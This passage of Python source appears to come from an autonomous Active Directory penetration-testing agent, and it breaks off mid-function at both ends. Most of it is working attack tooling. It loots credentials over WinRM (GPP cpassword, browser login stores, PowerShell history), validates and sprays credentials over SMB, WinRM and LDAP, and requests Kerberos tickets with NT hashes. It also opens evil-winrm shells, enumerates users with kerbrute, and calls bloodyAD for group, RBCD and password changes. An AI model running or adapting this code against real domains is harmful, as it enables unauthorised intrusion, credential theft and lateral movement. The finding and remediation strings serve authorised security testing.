        )),
        # Group Policy Preferences
        ("gpp_passwords", (
            'findstr /spin /i "cpassword" '
            "C:\\Windows\\sysvol\\* C:\\ProgramData\\Microsoft\\* 2>NUL"
        )),
        # Recent documents / shares
        ("recent_docs", (
            f'dir "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Recent" 2>NUL'
        )),
        # Browser saved passwords (presence check only)
        ("browser_creds", (
            'for %p in ('
            f'"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" '
            f'"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\key4.db"'
            ") do @if exist %p echo Found browser cred store: %p"
        )),
    ]

    for label, cmd in loot_commands:
        out = _nxc(f"winrm {shell_quote(host)} {auth} -x {shell_quote(cmd)}", timeout=40)
        if out and len(out.strip()) > 5:
            results.append(f"--- {label} ---\n{out[:800]}")
            low = out.lower()
            if any(x in low for x in ("password=", "passwd=", "cpassword", "administratorpassword")):
                add_finding("Plaintext Credential Found", "Critical",
                            f"Cleartext password found in {label} on {host}",
                            "Rotate credentials; remove plaintext config; use Windows Credential Manager")
            if "id_rsa" in low or ".ppk" in low:
                add_finding("SSH Private Key Found", "High",
                            f"SSH private key discovered on {host} — may enable lateral movement",
                            "Remove unnecessary SSH keys; use certificate-based SSH auth")
            if "cpassword" in low:
                add_finding("GPP Password (MS14-025)", "Critical",
                            f"Group Policy Preferences encrypted password found — decrypt with gpp-decrypt",
                            "Remove all GPP passwords; apply MS14-025")

    return "\n".join(results)[:6000]


def _derive_scoped_subnet(dc_ip: str) -> str:
    ip = str(dc_ip or "").strip()
    if re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", ip):
        parts = ip.split(".")
        return ".".join(parts[:3] + ["0"]) + "/24"
    return ""


def _known_winrm_candidate_hosts(dc_ip: str, target_subnet: str = "") -> list:
    """Return a conservative host scope for WinRM auth testing.

    Only scan specific known hosts by default. Subnet scanning is opt-in via
    target_subnet or SESSION["target_subnet"] to avoid hitting unrelated machines
    on shared networks (e.g. a /24 that contains other tenants' hosts).
    """
    candidates = []
    for value in [
        dc_ip,
        SESSION.get("dc_fqdn", ""),
        SESSION.get("dc_hostname", ""),
    ]:
        value = str(value or "").strip()
        if value and value not in candidates:
            candidates.append(value)

    # Only add subnet if explicitly requested — never auto-derive /24
    for value in [target_subnet, SESSION.get("target_subnet", ""), SESSION.get("subnet", "")]:
        value = str(value or "").strip()
        if value and "/" in value and value not in candidates:
            candidates.append(value)

    return candidates


def _parse_nxc_hosts(out: str) -> list:
    hosts = []
    for line in (out or "").splitlines():
        m = re.search(r'WINRM\s+([A-Za-z0-9_.:-]+)\s+\d+', line, re.I)
        if m and m.group(1) not in hosts:
            hosts.append(m.group(1))
    return hosts


def tool_discover_winrm_access(dc_ip: str, domain: str, username: str,
                               password: str = "", nt_hash: str = "",
                               target_subnet: str = "") -> str:
    """Find the correct WinRM target for a credential instead of assuming the DC."""
    password = _real_secret(password)
    nt_hash = _real_nt_hash(nt_hash)
    auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    candidates = _known_winrm_candidate_hosts(dc_ip, target_subnet)
    found = []
    outputs = []

    for target in candidates[:8]:
        out = _nxc(f"winrm {shell_quote(target)} {auth}", timeout=35)
        outputs.append(f"--- nxc winrm {target} ---\n{out[:1200]}")
        hosts = _parse_nxc_hosts(out)
        if "Pwn3d" in out:
            for host in hosts or [target]:
                if host not in found:
                    found.append(host)
                    _add_owned_machine(host, user=username, method="WinRM",
                                       nt_hash=nt_hash,
                                       time=datetime.now().isoformat())
                    add_finding(
                        "WinRM Access Discovered", "Critical",
                        f"WinRM Pwn3d: {domain}\\{username} on {host}",
                        "Restrict WinRM access to approved management hosts; audit local administrators.",
                    )
        elif any(s in out for s in ("[+]", "STATUS_SUCCESS")):
            for host in hosts or [target]:
                if host not in found:
                    found.append(host)

    intel = SESSION.setdefault("agent_intel", {})
    targets = intel.setdefault("winrm_targets", [])
    for host in found:
        if host not in targets:
            targets.append(host)

    if found:
        save_session()
        first = found[0]
        return (
            f"WinRM Pwn3d: {first}\n"
            f"All WinRM targets: {found}\n"
            f"NEXT: evil_winrm target_ip={first} username={username} "
            f"{'nt_hash=' + nt_hash if nt_hash else 'password=<session>'}\n\n"
            + "\n".join(outputs)
        )[:5000]

    return (
        "WinRM discovery found no shell-capable host for this credential.\n"
        f"Tested: {candidates}\n\n" + "\n".join(outputs)
    )[:5000]


def tool_test_credential(dc_ip: str, domain: str, username: str,
                         password: str = "", nt_hash: str = "") -> str:
    password = _real_secret(password)
    nt_hash = _real_nt_hash(nt_hash)
    auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    results = []
    intel = SESSION.setdefault("agent_intel", {})
    tested = intel.setdefault("valid_creds_tested", [])
    validation = {
        "user": username,
        "password": password,
        "nt_hash": nt_hash,
        "ldap": False,
        "smb": [],
        "winrm": [],
        "admin": False,
    }

    def _accepted(out: str) -> bool:
        return any(s in (out or "") for s in ("[+]", "STATUS_SUCCESS", "Pwn3d"))

    candidates = _known_winrm_candidate_hosts(dc_ip)
    for target in candidates[:8]:
        smb = _nxc(f"smb {shell_quote(target)} {auth}", timeout=15)
        winrm = _nxc(f"winrm {shell_quote(target)} {auth}", timeout=15)
        results.append(f"SMB {target}:   {smb.splitlines()[-1] if smb else 'timeout'}")
        results.append(f"WinRM {target}: {winrm.splitlines()[-1] if winrm else 'timeout'}")
        if _accepted(smb):
            if target not in validation["smb"]:
                validation["smb"].append(target)
        if "Pwn3d" in winrm:
            validation["admin"] = True
            for host in _parse_nxc_hosts(winrm) or [target]:
                if host not in validation["winrm"]:
                    validation["winrm"].append(host)

    ldap = _nxc(f"ldap {shell_quote(dc_ip)} {auth}", timeout=15)
    results.append(f"LDAP {dc_ip}:  {ldap.splitlines()[-1] if ldap else 'timeout'}")
    validation["ldap"] = _accepted(ldap)

    marker = {"user": username, "password": password, "nt_hash": nt_hash}
    if marker not in tested:
        tested.append(marker)

    validated = intel.setdefault("validated_creds", [])
    if validation not in validated:
        validated.append(validation)

    if validation["ldap"] or validation["smb"] or validation["winrm"]:
        cred = {"user": username, "password": password, "auth": "validated"}
        store = intel.setdefault("valid_creds", [])
        if password and cred not in store:
            store.append(cred)
        add_finding(
            f"Validated Credential: {username}", "High",
            f"{domain}\\{username} accepted by "
            f"LDAP={validation['ldap']} SMB={validation['smb']} WinRM={validation['winrm']}",
            "Remove plaintext credentials from descriptions/files; rotate the account password.",
        )

    for host in validation["winrm"]:
        wt = intel.setdefault("winrm_targets", [])
        if host not in wt:
            wt.append(host)
        add_finding(f"Admin WinRM Access: {username}", "Critical",
                    f"{domain}\\{username} has administrative WinRM access on {host}",
                    "Restrict local admin accounts")
        _add_owned_machine(host, user=username, method="WinRM",
                           time=datetime.now().isoformat())

    save_session()
    return ("\n".join(results)
            + f"\nLDAP valid: {'YES' if validation['ldap'] else 'No'}"
            + f"\nSMB valid: {validation['smb'] or 'No'}"
            + f"\nWinRM admin: {validation['winrm'] or 'No'}")


def tool_update_session(**kwargs) -> str:
    updates = {}
    if kwargs.get("username"):    updates["username"]  = kwargs["username"]
    if kwargs.get("password"):    updates["password"]  = kwargs["password"]
    if kwargs.get("nt_hash"):     updates["nt_hash"]   = kwargs["nt_hash"]
    if kwargs.get("owned_users"):
        for u in kwargs["owned_users"]:
            if {"user": u} not in SESSION["owned_users"]:
                SESSION["owned_users"].append({"user": u, "method": "agent",
                                               "time": datetime.now().isoformat()})
    if kwargs.get("owned_machines"):
        for m in kwargs["owned_machines"]:
            _add_owned_machine(m, method="agent",
                               time=datetime.now().isoformat())
    SESSION.update(updates)
    save_session()
    return f"Session updated: {list(updates.keys())} | Owned: {len(SESSION['owned_users'])}u / {len(SESSION['owned_machines'])}m"


def tool_run_module(module_num: str, description: str = "") -> str:
    info(f"Agent requests module [{module_num}]: {description}")
    return f"Module [{module_num}] requires interactive execution. Use specific tool functions instead."


def tool_generate_report(engagement_name: str = "", summary: str = "") -> str:
    import importlib
    SESSION["engagement"] = engagement_name or SESSION.get("engagement") or "Agent-Run"
    try:
        mod = importlib.import_module("modules.reporting")
        importlib.reload(mod)
        mod.pause = lambda *args, **kwargs: None
        paths = mod.run() or {}
        findings = SESSION.get("findings", [])
        counts = {s: sum(1 for f in findings if f.get("severity") == s)
                  for s in ["Critical","High","Medium","Low","Info"]}
        return (f"Report ready: {len(findings)} findings\n"
                f"Critical: {counts['Critical']} | High: {counts['High']} | "
                f"Medium: {counts['Medium']} | Low: {counts['Low']}\n"
                f"HTML: {paths.get('html', 'output/reports/')}\n"
                f"Markdown: {paths.get('markdown', 'output/reports/')}\n"
                f"JSON: {paths.get('json', 'output/reports/')}")
    except Exception as e:
        return f"Report summary: {len(SESSION.get('findings',[]))} findings collected. {e}"


def tool_request_tgt(dc_ip: str, domain: str, username: str,
                     password: str = "", nt_hash: str = "") -> str:
    """Request a Kerberos TGT using pip impacket API directly (no system script issues).
    Falls back to kinit. Essential when NTLM is disabled."""
    import subprocess as _sp

    realm   = domain.upper()
    dc_fqdn = _dc_host_for_kerberos(domain, dc_ip)
    ccache  = str(_runtime_path(f"{username}_{domain}.ccache"))

    # ── Step 1: Build krb5.conf ───────────────────────────────────────────────
    # Use the DC IP as KDC/admin_server. This avoids DNS/SRV lookup failures in
    # environments where the DC FQDN may not resolve on the attacker machine.
    conf_path = _target_krb5_config(dc_ip, domain, dc_fqdn)
    krb5_conf = Path(conf_path).read_text()
    os.environ["KRB5_CONFIG"] = conf_path
    os.environ["KRB5CCNAME"]  = ccache
    SESSION["krb5_config"] = conf_path

    system_krb5_status = "not attempted"
    try:
        if Path("/etc/krb5.conf").exists():
            _sp.run(["sudo", "-n", "cp", "/etc/krb5.conf", "/etc/krb5.conf.adstrike.bak"],
                    capture_output=True, text=True, timeout=5)
        krb5_write = _sp.run(["sudo", "-n", "tee", "/etc/krb5.conf"],
                             input=krb5_conf, capture_output=True, text=True, timeout=5)
        if krb5_write.returncode == 0:
            system_krb5_status = "updated /etc/krb5.conf with target IP KDC"
        else:
            system_krb5_status = (
                "could not update /etc/krb5.conf without sudo; using "
                f"{conf_path} via KRB5_CONFIG"
            )
    except Exception as e:
        system_krb5_status = f"could not update /etc/krb5.conf ({e}); using {conf_path}"

    # ── Step 2: /etc/hosts ────────────────────────────────────────────────────
    try:
        hosts = Path("/etc/hosts").read_text()
        if dc_fqdn not in hosts:
            _sp.run(f"echo '{dc_ip} {dc_fqdn} {domain}' | sudo -n tee -a /etc/hosts",
                    shell=True, capture_output=True)
    except Exception:
        pass

    # ── Step 3: Time sync — multiple fallbacks for restricted environments ────
    # Corporate firewalls often block UDP 123 (NTP). We try:
    #   1. ntpdate/ntpdig/chronyd (UDP 123) — common in labs
    #   2. LDAP rootDSE currentTime (TCP 389) — always available on AD
    #   3. Kerberos-based offset (TCP 88) — works when NTP+LDAP both blocked
    # If all fail we use faketime with LDAP currentTime offset instead of stepping.
    sync_out = ""

    # NTP-based sync (UDP 123) — may be firewalled in real corporate networks.
    # Use sudo -n so autonomous agent runs never block on an interactive
    # password prompt; if sudo is unavailable, fall back to faketime below.
    for sync_cmd in [
        f"sudo -n ntpdate -u {dc_fqdn}",
        f"sudo -n ntpdate -u {dc_ip}",
        f"sudo -n ntpdig -S {dc_fqdn}",
        f"sudo -n ntpdig -S {dc_ip}",
        f"sudo -n chronyd -q 'server {dc_fqdn} iburst'",
        f"sudo -n chronyd -q 'server {dc_ip} iburst'",
    ]:
        r = _run(f"{sync_cmd} 2>&1", timeout=8)
        if r and "error" not in r.lower() and "no eligible" not in r.lower() and "TIMEOUT" not in r:
            sync_out = r[:80]
            break

    if not sync_out:
        # Fallback: LDAP rootDSE currentTime (TCP 389 — always open on AD DCs)
        ldap_time = _dc_time()   # uses LDAP rootDSE as first choice
        if ldap_time:
            sync_out = f"Time from LDAP rootDSE: {ldap_time} (faketime will be applied)"
        else:
            # Last resort: read DC time from Kerberos AS-REQ error response
            # The KDC_ERR_SKEW error includes the server's current time
            kdc_probe = _run(
                f"python3 -c \""
                f"from impacket.krb5.kerberosv5 import getKerberosTGT;"
                f"from impacket.krb5 import constants;"
                f"print('kdc_probe')\" 2>&1 || true",
                timeout=5
            )
            sync_out = "time sync skipped (UDP 123 blocked — faketime will use LDAP rootDSE offset)"

    # ── Step 4: Request TGT ────────────────────────────────────────────────────
    # Use system impacket (PYTHONPATH fix) — same approach as _nxc() wrapper
    # This avoids all pip vs system impacket version conflicts
    tgt_py = "/usr/share/doc/python3-impacket/examples/getTGT.py"
    sys_pkgs = "/usr/lib/python3/dist-packages"
    env_tgt  = {**os.environ,
                "PYTHONPATH": f"{sys_pkgs}:{os.environ.get('PYTHONPATH','')}",
                "PYTHONNOUSERSITE": "1",
                "KRB5_CONFIG": conf_path,
                "KRB5CCNAME":  ccache}

    if nt_hash:
        nt = nt_hash.split(":")[-1]
        cmd = f"{_SYSPY} {tgt_py} {domain}/{username} -hashes :{nt} -dc-ip {dc_ip}"
    else:
        cmd = f"{_SYSPY} {tgt_py} {domain}/{username}:'{password}' -dc-ip {dc_ip}"

    try:
        _record_agent_command(cmd)
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=30, env=env_tgt)
        tgt_out = _strip_ansi((r.stdout + r.stderr).strip())
    except Exception as e:
        tgt_out = f"[ERROR] {e}"

    # impacket saves as username.ccache in CWD — move to /tmp
    cwd_cc = f"{username}.ccache"
    if Path(cwd_cc).exists():
        try:
            shutil.move(cwd_cc, ccache)
        except Exception:
            ccache = cwd_cc

    if Path(ccache).exists() or "Saving ticket" in tgt_out:
        tgt_result = f"getTGT.py (system impacket): {tgt_out[:150]}"
    else:
        tgt_result = f"getTGT.py failed: {tgt_out[:200]}"
        # Fallback: kinit
        kinit_out = _run(
            f"printf '%s\\n' '{password}' | "
            f"env KRB5_CONFIG={conf_path} KRB5CCNAME={ccache} "
            f"kinit {username}@{realm} 2>&1",
            timeout=15)
        tgt_result += f" | kinit: {kinit_out[:150]}"

    # ── Check result ──────────────────────────────────────────────────────────
    if _ccache_is_valid(ccache):
        os.environ["KRB5CCNAME"] = ccache
        SESSION["krb5_ccache"]   = ccache
        SESSION["use_kerberos"]  = True
        save_session()
        # Pre-fetch ldap/<dc> service ticket so downstream Kerberos clients
        # (bloodhound-python, bloodyAD, certipy) don't crash inside getKerberosTGS.
        _prefetch_ldap_tgs(domain, dc_ip, dc_fqdn)
        # Verify ticket
        klist = _run(f"KRB5CCNAME={ccache} klist 2>&1", timeout=5)
        return (f"TGT OBTAINED SUCCESSFULLY\n"
                f"ccache: {ccache}\n"
                f"KRB5CCNAME={ccache}\n"
                f"KRB5_CONFIG={conf_path}\n"
                f"System krb5.conf: {system_krb5_status}\n"
                f"Time sync: {sync_out}\n"
                f"Method: {tgt_result[:100]}\n"
                f"klist:\n{klist}\n\n"
                f"Kerberos mode ENABLED (ldap TGS pre-cached) — next: adcs_scan")
    if Path(ccache).exists():
        SESSION["use_kerberos"] = False
        SESSION["krb5_ccache"] = ""
        os.environ.pop("KRB5CCNAME", None)
        return (f"TGT request failed: ccache was created but is not valid or is expired\n"
                f"ccache: {ccache}\n"
                f"System krb5.conf: {system_krb5_status}\n"
                f"KRB5_CONFIG={conf_path}\n"
                f"sync: {sync_out}\n"
                f"result: {tgt_result[:300]}")
    return (f"TGT request failed\n"
            f"System krb5.conf: {system_krb5_status}\n"
            f"KRB5_CONFIG={conf_path}\n"
            f"sync: {sync_out}\n"
            f"result: {tgt_result[:300]}\n"
            f"Ensure {dc_fqdn} → {dc_ip} in /etc/hosts")


def tool_evil_winrm(dc_ip: str, domain: str, username: str,
                    password: str = "", nt_hash: str = "",
                    command: str = "whoami /all; hostname; ipconfig",
                    target_ip: str = "") -> str:
    """Get a shell via evil-winrm. Supports password, hash, or Kerberos (NTLM-disabled).
    Requires port 5985 (HTTP) or 5986 (HTTPS) to be open."""
    # Always use FQDN for Kerberos (IP fails Kerberos SPN validation)
    target = str(target_ip or dc_ip).strip()
    fqdn  = target if target and not re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", target) else _dc_host_for_kerberos(domain, dc_ip)
    realm = domain.upper()
    password = _real_secret(password)
    nt_hash = _real_nt_hash(nt_hash)
    krb = _session_kerberos_usable(username, domain)
    use_krb_auth = False

    # ADCS/ESC13 first: when a verified privileged ccache exists, the WinRM right
    # lives ONLY in that ticket's PAC — the NT hash (UnPAC of the same user) is
    # unprivileged. So prefer Kerberos with the *_adcs ccache before the NT-hash
    # branch, and don't let a clobbered SESSION['krb5_ccache'] downgrade us.
    _priv_cc = _active_priv_ccache(username, domain)
    if _priv_cc:
        use_krb_auth = True
        ccache = _priv_cc
        os.environ["KRB5CCNAME"] = ccache
        connect_cmd = f"evil-winrm -i {fqdn} -r {realm} -K {ccache}"
        nxc_auth    = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    elif nt_hash:
        nt = nt_hash
        connect_cmd = f"evil-winrm -i {target} -u '{username}' -H '{nt}'"
        nxc_auth    = f"-u '{username}' -H '{nt}' -d {domain}"
    elif password and not SESSION.get("ntlm_disabled"):
        connect_cmd = f"evil-winrm -i {target} -u '{username}' -p '{password}'"
        nxc_auth    = f"-u '{username}' -p '{password}' -d {domain}"
    elif krb:
        use_krb_auth = True
        ccache = SESSION["krb5_ccache"]
        os.environ["KRB5CCNAME"] = ccache
        connect_cmd = f"evil-winrm -i {fqdn} -r {realm} -K {ccache}"
        nxc_auth    = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    elif not password:
        return "WinRM skipped: no usable password, NT hash, or Kerberos ticket is available."
    elif SESSION.get("ntlm_disabled"):
        return (f"NTLM disabled and no valid Kerberos ccache for {username}. "
                f"Call request_tgt before evil_winrm.")
    else:
        connect_cmd = f"evil-winrm -i {target} -u '{username}' -p '{password}'"
        nxc_auth    = f"-u '{username}' -p '{password}' -d {domain}"

    host = fqdn if use_krb_auth else target
    ewrm_bin = shutil.which("evil-winrm") or "evil-winrm"

    # Step 1: Test access
    # nxc winrm only supports NTLM — when Kerberos is required, test with
    # evil-winrm directly by piping a one-shot command via stdin.
    test = ""
    access_confirmed = False
    if use_krb_auth:
        # Pipe commands to evil-winrm; success shows a PS> prompt in stdout
        ewrm_probe = (
            f"printf 'whoami\\nhostname\\nexit\\n' | "
            f"timeout 25 {ewrm_bin} -i {shell_quote(fqdn)} "
            f"-r {shell_quote(realm)} -K {shell_quote(ccache)} 2>&1"
        )
        _record_agent_command(ewrm_probe)
        test = _run(ewrm_probe, timeout=30)
        # evil-winrm prints "PS C:\..." or "Evil-WinRM PS" on success
        access_confirmed = any(s in test for s in (
            "PS C:\\", "Evil-WinRM PS", "Evil-WinRM shell",
            f"{domain.split('.')[0].upper()}\\", f"{domain.split('.')[0].lower()}\\",
        ))
        if not access_confirmed and "Evil-WinRM" in test and "Error" not in test[:200]:
            # Connected but prompt didn't appear in time — assume success
            access_confirmed = True
    else:
        test = _nxc(f"winrm {host} {nxc_auth}", timeout=20)
        access_confirmed = "Pwn3d!" in test

    # Additive Kerberos fallback (ESC13 / PAC-injected group membership):
    # An NT hash or password authenticates the *account*, but ADCS ESC13's
    # privilege (e.g. an OID->group link granting Remote Management Users) lives
    # ONLY in the Kerberos TGT's PAC, never in the NT hash. So when the NTLM/hash
    # or password probe above did NOT confirm access yet a usable Kerberos ccache
    # exists, retry the probe over Kerberos with evil-winrm before giving up.
    # Purely additive: never runs when access is already confirmed, so cases
    # where NTLM works are completely unaffected. Target-agnostic — keys only off
    # "a ccache is available and NTLM didn't get us in".
    if (not access_confirmed) and (not use_krb_auth) and krb and SESSION.get("krb5_ccache"):
        ccache = SESSION["krb5_ccache"]
        os.environ["KRB5CCNAME"] = ccache
        krb_probe = (
            f"printf 'whoami\\nhostname\\nexit\\n' | "
            f"timeout 25 {ewrm_bin} -i {shell_quote(fqdn)} "
            f"-r {shell_quote(realm)} -K {shell_quote(ccache)} 2>&1"
        )
        _record_agent_command(krb_probe)
        krb_test = _run(krb_probe, timeout=30)
        krb_ok = any(s in krb_test for s in (
            "PS C:\\", "Evil-WinRM PS", "Evil-WinRM shell",
            f"{domain.split('.')[0].upper()}\\", f"{domain.split('.')[0].lower()}\\",
        ))
        if not krb_ok and "Evil-WinRM" in krb_test and "Error" not in krb_test[:200]:
            krb_ok = True
        if krb_ok:
            use_krb_auth = True
            access_confirmed = True
            host = fqdn
            test = krb_test
            connect_cmd = f"evil-winrm -i {fqdn} -r {realm} -K {ccache}"

    if access_confirmed:
        add_finding("WinRM Shell Access Confirmed", "Critical",
                    f"WinRM access: {username}@{host}",
                    "Restrict WinRM; audit Remote Management Users group",
                    proof_level="owned")
        _add_owned_machine(host, user=username, nt_hash=nt_hash,
                           method="WinRM (Kerberos)" if use_krb_auth else "WinRM",
                           time=datetime.now().isoformat())
        save_session()

    # Step 2: Collect recon output
    recon_cmds = [
        ("whoami",     "whoami /all"),
        ("hostname",   "hostname"),
        ("users",      "dir C:\\Users\\"),
        ("network",    "ipconfig /all"),
        ("ps_history", f"type C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>NUL"),
    ]

    results = [f"=== WinRM Access: {username}@{host} ===",
               f"evil-winrm probe: {test.splitlines()[-1] if test else 'N/A'}",
               f"Interactive shell: {connect_cmd}",
               ""]

    if access_confirmed:
        if use_krb_auth:
            # Collect recon via evil-winrm stdin pipe (nxc doesn't support Kerberos WinRM)
            for label, cmd_str in recon_cmds:
                ewrm_recon = (
                    f"printf '{cmd_str}\\nexit\\n' | "
                    f"timeout 20 {ewrm_bin} -i {shell_quote(fqdn)} "
                    f"-r {shell_quote(realm)} -K {shell_quote(ccache)} 2>&1"
                )
                out = _run(ewrm_recon, timeout=25)
                if out and "Error" not in out[:80]:
                    results.append(f"--- {label} ---\n{out[:600]}")
        else:
            for label, cmd_str in recon_cmds:
                out = _nxc(f"winrm {host} {nxc_auth} -x '{cmd_str}'", timeout=30)
                if out and "ERROR" not in out.upper()[:50]:
                    results.append(f"--- {label} ---\n{out[:600]}")

        results.append(f"\nPwn3d!  Connect: {connect_cmd}")
        return "\n".join(results)
    elif "STATUS_NOT_SUPPORTED" in test and not krb:
        return (f"NTLM disabled — call request_tgt first\n"
                f"Then: {connect_cmd}")
    else:
        return (f"WinRM not accessible\nProbe: {test[:400]}\n"
                f"Connect command: {connect_cmd}")


def tool_kerbrute_enum(dc_ip: str, domain: str,
                       wordlist: str = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
                       threads: str = "50") -> str:
    """Enumerate valid AD users via Kerberos (port 88) — no credentials required.
    Works even when NTLM is disabled. Valid users returned for AS-REP roasting."""
    # Preferred username wordlists in priority order (smaller lists first to avoid timeout)
    USERNAME_WORDLISTS = [
        "/usr/share/seclists/Usernames/Names/names.txt",
        "/usr/share/wordlists/seclists/Usernames/Names/names.txt",
        "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
        "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
    ]
    # Always use the priority list (smallest first) to avoid 120 s timeout.
    # The default parameter is kept only for API compatibility — it is ignored.
    wordlist = ""
    for candidate in USERNAME_WORDLISTS:
        if Path(candidate).exists():
            wordlist = candidate
            break
    if not wordlist:
        return ("Wordlist not found. Install: sudo apt install seclists\n"
                "Or provide path to a usernames wordlist (not a password list)")

    out_file = "/tmp/kerbrute_users.txt"
    out = _run(f"kerbrute userenum --dc {dc_ip} --domain {domain} "
               f"-t {threads} --output {out_file} {wordlist}", timeout=120)
    valid = re.findall(r"VALID USERNAME:\s*([\w\.\-]+)@", out)
    if valid:
        Path("/tmp/users.txt").write_text("\n".join(valid))
        return (f"Found {len(valid)} valid users via Kerberos enum (no NTLM needed)\n"
                f"Users: {valid[:20]}\n"
                f"Saved to: /tmp/users.txt and {out_file}\n"
                f"Next: asrep_roast with userlist=/tmp/users.txt")
    return f"No valid users found (or kerbrute not installed)\nOutput:\n{out[:1000]}"


def tool_no_cred_surface_recon(dc_ip: str, domain: str) -> str:
    """No-credential checks for externally visible AD attack surface."""
    results = []
    intel = SESSION.setdefault("agent_intel", {})
    open_ports = {str(p) for p in intel.get("open_ports", [])}

    def _port_known(port: str) -> bool:
        return not open_ports or str(port) in open_ports

    if _port_known("389"):
        base = _run(
            f"ldapsearch -x -H ldap://{shell_quote(dc_ip)} -s base -b '' "
            f"defaultNamingContext dnsHostName supportedCapabilities 2>/dev/null",
            timeout=10,
        )
        results.append(f"=== LDAP RootDSE (anonymous) ===\n{base[:800] or '(no anonymous RootDSE response)'}")

    if _port_known("445"):
        null_smb = _nxc(f"smb {shell_quote(dc_ip)} -u '' -p '' --shares", timeout=20)
        guest_smb = _nxc(f"smb {shell_quote(dc_ip)} -u 'guest' -p '' --shares", timeout=20)
        results.append(f"=== SMB Null Session Shares ===\n{null_smb[:900] or '(no output)'}")
        results.append(f"=== SMB Guest Shares ===\n{guest_smb[:900] or '(no output)'}")
        if re.search(r"\bREAD\b", null_smb + guest_smb, re.I):
            add_finding("SMB Null/Guest Share Access", "High",
                        "Unauthenticated or guest SMB share read access was observed",
                        "Disable guest/null SMB access and review share ACLs")

    web_ports = [p for p in ("80", "443", "8080", "8443", "8530", "8531") if _port_known(p)]
    web_hits = []
    for port in web_ports:
        scheme = "https" if port in {"443", "8443", "8531"} else "http"
        base_url = f"{scheme}://{dc_ip}:{port}"
        headers = _run(f"curl -k -I -sS --max-time 5 {shell_quote(base_url)} 2>&1 | head -20", timeout=8)
        certsrv = _run(f"curl -k -I -sS --max-time 5 {shell_quote(base_url + '/certsrv/')} 2>&1 | head -20", timeout=8)
        web_hits.append(f"[{base_url}]\n{headers[:500] or '(no response)'}")
        if any(x in certsrv.lower() for x in ("401", "200", "certsrv", "www-authenticate")):
            web_hits.append(f"[{base_url}/certsrv/]\n{certsrv[:500]}")
            add_finding("ADCS HTTP Endpoint Exposed", "High",
                        f"ADCS web enrollment endpoint appears reachable at {base_url}/certsrv/",
                        "Require EPA/channel binding and restrict ADCS web enrollment exposure")
        if port in {"8530", "8531"} and headers:
            add_finding("WSUS Port Exposed", "Medium",
                        f"WSUS-like service is reachable on {base_url}",
                        "Require TLS for WSUS and restrict management access")
    if web_hits:
        results.append("=== HTTP/HTTPS Surface ===\n" + "\n\n".join(web_hits)[:2500])

    if _port_known("1433"):
        mssql = _nxc(f"mssql {shell_quote(dc_ip)} -u '' -p ''", timeout=20)
        results.append(f"=== MSSQL No-Cred Probe ===\n{mssql[:900] or '(no output)'}")
        if "mssql" in mssql.lower() or "sql server" in mssql.lower():
            add_finding("MSSQL Service Exposed", "Medium",
                        f"MSSQL is reachable on {dc_ip}:1433",
                        "Restrict MSSQL exposure and audit SQL authentication posture")

    return "\n\n".join(results)[:5000] if results else "No no-credential surface checks were applicable."


def tool_bloodyad(dc_ip: str, domain: str, username: str,
                  action: str = "get object",
                  target: str = "", attribute: str = "",
                  value: str = "", password: str = "",
                  nt_hash: str = "") -> str:
    """Run bloodyAD commands for AD object manipulation.
    Supports: get/set object attributes, add/remove group members, RBCD write,
    group scope changes, password resets. Kerberos-aware."""
    auth, env = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
    if not auth:
        return "bloodyAD skipped: no usable password, NT hash, or Kerberos ticket."

    cmd = f"{shell_quote(_bin('bloodyAD'))} {auth} {action}"
    if target:   cmd += f" '{target}'"
    if attribute: cmd += f" {attribute}"
    if value:
        # Only `set object` consumes the value via -v; other actions
        # (add/remove groupMember, set password, add rbcd, ...) take it
        # as a positional argument. Passing -v to them makes bloodyAD parse
        # it as the global verbosity flag and abort with "unrecognized -v".
        if action.strip().lower().startswith("set object"):
            cmd += f" -v '{value}'"
        else:
            cmd += f" '{value}'"

    try:
        r = subprocess.run(f"{_faketime_prefix()}{cmd}", shell=True, capture_output=True, text=True,
                           timeout=30, env=env)
        out = _strip_ansi((r.stdout + r.stderr).strip())
    except Exception as e:
        out = f"[ERROR] {e}"

    return f"bloodyAD [{action}] on '{target}':\n{out[:2000]}"


def _resolve_user_sid(dc_ip: str, domain: str, username: str,
                      password: str = "", nt_hash: str = "") -> str:
    """Resolve a sAMAccountName to its objectSid via LDAP. Returns '' on failure.

    Tries multiple back-ends because each one breaks under different lab
    conditions. Order is fastest-to-most-reliable:

      1. bloodyAD get object <sam> --attr objectSid  (uses same auth that works
         elsewhere in this module — proven in acl_abuse_scan / gmsa_takeover)
      2. ldap3 direct bind (most reliable, also works when external CLIs are
         missing or the system PYTHONPATH is broken)
      3. nxc ldap --search-filter ... --attributes objectSid (legacy fallback)

    The first successful canonical SID match wins. Bare DOMAIN\\acct or
    acct@domain forms are normalized to the bare sAMAccountName before query.
    """
    sam = username.split("@")[0].split("\\")[-1]
    if not sam:
        return ""

    sid_re = re.compile(r"S-1-5-21-\d+-\d+-\d+-\d+")

    # ── 1. bloodyAD ──────────────────────────────────────────────────────────
    bauth, benv = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
    if bauth:
        # `get object <sam> --attr objectSid` returns lines like:
        #   distinguishedName: CN=<account>,...
        #   objectSid: S-1-5-21-...-1104
        cmd = (
            f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bauth} "
            f"get object {shell_quote(sam)} --attr objectSid"
        )
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=20, env=benv)
            out = _strip_ansi((r.stdout + r.stderr).strip())
        except Exception:
            out = ""
        m = sid_re.search(out)
        if m:
            return m.group(0)

    # ── 2. ldap3 direct ──────────────────────────────────────────────────────
